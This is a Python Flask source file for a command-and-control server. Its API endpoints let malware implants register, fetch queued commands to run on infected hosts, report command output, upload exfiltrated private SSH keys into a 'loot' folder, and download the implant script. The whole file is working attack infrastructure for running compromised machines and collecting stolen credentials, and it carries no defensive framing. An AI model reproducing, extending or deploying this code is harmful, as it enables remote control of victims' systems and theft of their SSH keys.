from datetime import datetime

from flask import Blueprint, abort, request, send_from_directory

from c2 import Agent, Commands
from c2.app import add_agent, app, db

bp = Blueprint("api", __name__)

@app.route("/api/1.1/add_agent", methods=["POST"])
def agent_add():
    """API endpoint that allows an implant to register
    itself to the server

    :returns: the new agent ID
    :rtype: str
    """
    if request.method == "POST":
        agent_dict = request.json
        id = add_agent(agent_dict)
        return str(id)


@app.route("/api/1.1/get_command", methods=["POST"])
def get_command():
    """API endpoint that allows an implant to fetch
    commands from the server

    :returns: none if there are no commands to retrieve,
    else the command and it's ID
    :rtype: str
    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return "Bad request"
        agent_id = int(json["id"])
        agent = Agent.query.filter(Agent.id == agent_id).first()
        curr_time = datetime.now()
        agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
        res = Commands.query.filter(
            Commands.implantID == agent_id, Commands.retrieved == False
        ).first()
        if res is None:
            db.session.commit()
            db.session.flush()
            return "None"
        res.retrieved = True
        db.session.flush()
        db.session.commit()
        return res.command + "," + str(res.commandID)


@app.route("/api/1.1/command_out", methods=["POST"])
def command_out():
    """API endpoint that allows an implant to send
    output of commands back to the server

    :returns: status to the agent of whether it received the output
    :rtype: str
    """
    print(request.method)
    if request.method == "POST":
        json = request.json
        if json is None:
            return "Bad request"
        output = json["output"]
        implantID = json["implantID"]
        commandID = json["commandID"]
        command = Commands.query.filter(
            Commands.implantID == implantID, Commands.commandID == commandID
        ).first()
        command.output = output
        db.session.flush()
        db.session.commit()
        return "Received"


@app.route("/api/1.1/ssh_keys", methods=["POST"])
def ssh_keys():
    """API endpoint that allows an agent to send back exfiltrated
    private ssh keys

    :returns: status to the agent of whether it received the keys
    :rtype: str
    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return "Bad request"
        key_dict = json["keys"]
        agent_id = json["id"]
        with open(f"loot/agent_{agent_id}/ssh_keys.txt", "a+") as file:
            for key in key_dict:
                file.write(f"{key}: {key_dict[key]}\n")
        return "Received BINGUS MODE"


@app.route("/api/1.1/retrieve_scripts", methods=["GET"])
def scripts():
    """API endpoint that allows an agent to retrieve scripts
    from the server

    :returns: files that the agent requested
    :rtype: file
    """
    try:
        return send_from_directory(
            "implant", path="implant.py", filename="implant.py", as_attachment=True
        )
    except FileNotFoundError:
        abort(404)
